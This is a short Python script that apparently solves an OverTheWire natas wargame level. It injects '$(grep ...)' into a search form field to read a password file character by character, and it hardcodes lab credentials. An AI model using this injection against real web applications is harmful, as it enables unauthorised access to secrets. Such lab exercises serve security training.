#!/bin/env python
import requests

brute = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghiklmnopqrstuvwxyz0123456789'
#brute = 'a'
url="http://natas16.natas.labs.overthewire.org/"
user = 'natas16'
passw = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
password = '8Ps3H0GWbn5rd9S7GmAdgQNdkh'
while(True):
	for ch in brute :
		data = {"needle":'nice$(grep ^'+password+ch+' /etc/natas_webpass/natas17)',
				"submit":"Search"}
		'''print data'''
		r = requests.post(url, data, auth=(user, passw))
		content = r.text
		#print "trying with password "+ch
		
		if 'nice' not in r.text:
			password = password+ch

		if(len(password)>32):
			exit(0)

		#print content
		print "trying with password "+password+ch
		print password

	